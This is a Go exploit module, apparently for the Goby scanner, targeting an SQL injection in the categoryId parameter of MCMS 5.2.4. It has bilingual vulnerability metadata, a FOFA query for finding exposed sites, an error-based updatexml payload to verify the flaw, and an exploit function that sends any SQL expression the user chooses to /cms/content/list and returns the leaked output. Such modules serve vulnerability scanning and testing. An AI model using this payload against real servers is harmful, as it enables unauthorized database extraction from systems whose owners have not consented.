package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "MCMS 5.2.4 categoryId sql vulnerability",
    "Description": "<p>Mingfei MCms is a complete open source content management system.</p><p>The categoryId parameter of MCms 5.2.4 has a SQL injection vulnerability. Attackers can use the vulnerability to obtain sensitive information and further control the server.</p>",
    "Impact": "<p>MCMS 5.2.4 categoryId sqli</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://gitee.com/mingSoft/MCMS\">https://gitee.com/mingSoft/MCMS</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "Product": "MCMS",
    "VulType": [
        "SQL Injection"
    ],
    "Tags": [
        "SQL Injection"
    ],
    "Translation": {
        "CN": {
            "Name": "铭飞 MCms v5.2.4 版本 categoryId 参数存在 SQL 注入漏洞",
            "Product": "MCMS",
            "Description": "<p>铭飞MCms 是一款完整开源的内容管理系统。</p><p>铭飞MCms 5.2.4版本 categoryId 参数存在SQL注入漏洞，攻击者可利用漏洞获取敏感信息，进一步控制服务器。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://gitee.com/mingSoft/MCMS\">https://gitee.com/mingSoft/MCMS</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>铭飞MCms 5.2.4版本 categoryId 参数存在SQL注入漏洞，攻击者可利用漏洞获取敏感信息，进一步控制服务器。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "MCMS 5.2.4 categoryId sql vulnerability",
            "Product": "MCMS",
            "Description": "<p>Mingfei MCms is a complete open source content management system.</p><p>The categoryId parameter of MCms 5.2.4 has a SQL injection vulnerability. Attackers can use the vulnerability to obtain sensitive information and further control the server.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://gitee.com/mingSoft/MCMS\">https://gitee.com/mingSoft/MCMS</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>MCMS 5.2.4 categoryId sqli</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "FofaQuery": "body=\"ms/1.0.0/ms.js\" || body=\"铭飞MCMS\"",
    "GobyQuery": "body=\"ms/1.0.0/ms.js\" || body=\"铭飞MCMS\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://gitee.com/mingSoft/MCMS",
    "DisclosureDate": "2022-01-04",
    "References": [
        "https://forum.butian.net/share/998"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "8.0",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "sqlQuery",
            "type": "input",
            "value": "user()",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10250"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri1 := "/cms/content/list"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg1.Data = `categoryId=1' and updatexml(1,concat(0x7e,md5(123),0x7e),1) and '1`
			if resp, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "202cb962ac59075b964b07152d234b7")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["sqlQuery"].(string)
			uri1 := "/cms/content/list"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg1.Data = fmt.Sprintf(`categoryId=1' and updatexml(1,concat(0x7e,%s,0x7e),1) and '1`, cmd)
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = resp.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
